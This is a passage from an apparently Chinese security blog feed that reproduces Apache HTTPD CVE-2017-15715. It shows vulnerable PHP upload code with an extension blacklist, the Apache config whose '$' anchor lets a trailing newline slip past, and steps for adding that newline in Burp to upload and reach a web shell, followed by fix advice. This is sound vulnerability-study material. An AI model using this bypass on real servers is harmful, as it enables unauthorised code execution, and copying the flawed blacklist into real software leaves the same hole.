class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    $name = basename($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span> . $name);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以看到上传的文件名用的不是平常看到的<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>的形式，这是因为会自动去掉换行    </p><p>下面来看一下配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> \<span class="attr">.php</span>$&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line">DirectoryIndex disabled</span><br><span class="line">DirectoryIndex index.php index.html</span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">var</span>/<span class="attr">www</span>/&gt;</span></span><br><span class="line">Options -Indexes</span><br><span class="line">AllowOverride All</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所有的以<code>php</code>为后缀的文件都会被当作<code>PHP</code>代码进行解析，问题就出在用<code>$</code>符进行了匹配，当<code>$</code>符进行正则匹配时会以换行符作为匹配结束的位置，这就造成了可以用换行符进行绕过对黑名单的检测</p><p>下面先上传一个<code>php</code>文件,burp抓包</p><p>当不作任何修改上传时</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/1.png" class=""><p>下面就是利用<code>CVE-2017-15715</code>的点，通过burp的hex功能添加换行符，图中标亮的就是修改的位置</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/2.png" class=""><p>上传成功</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/3.png" class=""><p>访问上传的shell，成功getshell</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/4.png" class=""><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.升级到最新版本</p><p>2.或将上传的文件重命名为为<code>时间戳+随机数+.jpg</code>的格式并禁用上传文件目录执行脚本权限</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞概要&quot;&gt;&lt;a href=&quot;#漏洞概要&quot; class=&quot;headerlink&quot; title=&quot;漏洞概要&quot;&gt;&lt;/a&gt;漏洞概要
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
</feed>
